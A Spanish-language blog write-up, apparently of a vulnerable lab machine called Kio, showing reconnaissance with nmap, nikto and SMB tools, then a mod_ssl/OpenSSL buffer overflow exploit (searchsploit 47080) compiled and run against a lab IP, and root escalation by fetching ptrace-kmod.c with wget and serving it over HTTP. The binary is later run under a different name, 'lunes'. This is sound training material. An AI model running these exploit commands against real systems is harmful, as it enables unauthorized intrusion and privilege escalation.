---
title: Kio - Writeup 
date: 2026-01-19 21:55:30 +/-TTTT
categories: [Máquinas]
tags: [Pentesting, LInux, Buffer Overflow] # TAG names should always be lowercase

description: Laboratorio
toc: false
---

<p style="font-size:1.2rem;">
En este artículo estaré mostrando como resolver la máquina Kio.
</p>

<p style="font-size:1.2rem;">
Una de las cosas que nos permitirá esta máquina es explotar un desbordamiento de búfer (Buffer Overflow) en OpenSSL al procesar parámetros SSL malformados que esto afecta a versiones antiguas de OpenSSL, se produce al manejar incorrectamente ciertos argumentos SSL (KEY_ARG) y permite a un atacante sobrescribir memoria.
</p>

## Reconocimiento

```
sudo nmap -sS -p- -v -T4 -O -A direccion_Ip
```

<p style="font-size:1.2rem;">

A continuación, podemos identificar los siguientes <strong>puertos y servicios abiertos</strong>:<br><br>

<strong>22</strong> = open <strong>SSH</strong> OpenSSH 2.9p2 (protocol 1.99)<br>
<strong>80</strong> = open <strong>HTTP</strong> Apache httpd 1.3.20<br>
<strong>139</strong> = open <strong>NetBIOS-SSN</strong> Samba smbd Unix<br>
<strong>443</strong> = open <strong>HTTPS</strong> Apache 1.3.20<br>
<strong>111</strong> = open <strong>RPCBind</strong><br>
<strong>32768</strong> = open <strong>RPC Status</strong>
</p>

![Desktop View](/assets/img/kio/scan1.jpeg){: width="900" height="900" }
![Desktop View](/assets/img/kio/scan2.jpeg){: width="900" height="900" }

## Análisis vulnerabilidades

<p style="font-size:1.2rem;">
Analizamos la página web en el puerto 80 con la herramienta "nikto":
</p>

```
nikto -h http://192.168.53.4/mrtg/mrtg.html
```

<p style="font-size:1.2rem;">

Intento de interactuar con recursos compartidos mediante las herramientas "smbmap" y "smbclient":
</p>

```
smbmap -H 192.168.53.4 -P 199 -u ' '
smbclient -L 192.168.53.4
```

![Desktop View](/assets/img/kio/scan3.jpeg){: width="900" height="900" }

<p style="font-size:1.2rem;">
<strong>Ojo:</strong> No se pudo establecer una <strong>conexión</strong> con el servicio.<br><br>
También se utilizó la herramienta <strong>enum4linux</strong> para la <strong>recolección de información</strong> del <strong>sistema operativo</strong> a través del protocolo <strong>SMB</strong>, pero no se encontró información.
</p>


## Descubrimiento versión del servicio samba

<p style="font-size:1.2rem;">
Descubro la versión del samba con metasploit y es un smb Unix (Samba 2.2.1a):
</p>

![Desktop View](/assets/img/kio/scan4.jpeg){: width="900" height="900" }

## Descubrimiento Mod_SSL y Explotación

Con la herramienta searchsploit se hallò un script en C para explotar la vulnerabilidad:
```
searchsploit mod_ssl ## Buscar un exploit de mod ssl
searchsploit -m 47080 ## Descargar script de exploit
```
Ejecutamos el script con:
```
gcc -o exploit 47080.c -lcrypto
```
Ejecutamos nuestro exploit y logramos entrar como usuario apache:
```
./exploit 0x6b 192.168.53.4 443 -c 50
```

![Desktop View](/assets/img/kio/scan5.jpeg){: width="900" height="900" }
![Desktop View](/assets/img/kio/scan6.jpeg){: width="900" height="900" }
![Desktop View](/assets/img/kio/scan7.jpeg){: width="900" height="900" }

## Escalación de privilegios

<p style="font-size:1.2rem;">
A continuación, vemos que para establecer la conexión con root no se logró descargar un archivo importante para escalar privilegios y lo descargamos con wget:
</p>

```
wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
```
<p style="font-size:1.2rem;">
Para pasar este archivo al otro linux primero levantamos un servidor web con python en el puerto 8080 (no necesariamente puede ser el 8080):
</p>

```
python3 -m http.server 8080
```
<p style="font-size:1.2rem;">
Luego copiamos la ruta de direcición web del archivo y le pegamos en la sección correspondiente de wget en elcódigo 47080.c que corresponde al archivo de exploit para que se descargue con éxito el archivo para subir al usuario root.
</p>

<p style="font-size:1.2rem;">
Ejecutamoms otra vez:
</p>

```
./lunes 0x6b 192.168.53.4 443 -c 45
```

<p style="font-size:1.2rem;">
Somos Root.
</p>


![Desktop View](/assets/img/kio/scan8.jpeg){: width="900" height="900" }
![Desktop View](/assets/img/kio/scan9.jpeg){: width="900" height="900" }
![Desktop View](/assets/img/kio/scan10.jpeg){: width="900" height="900" }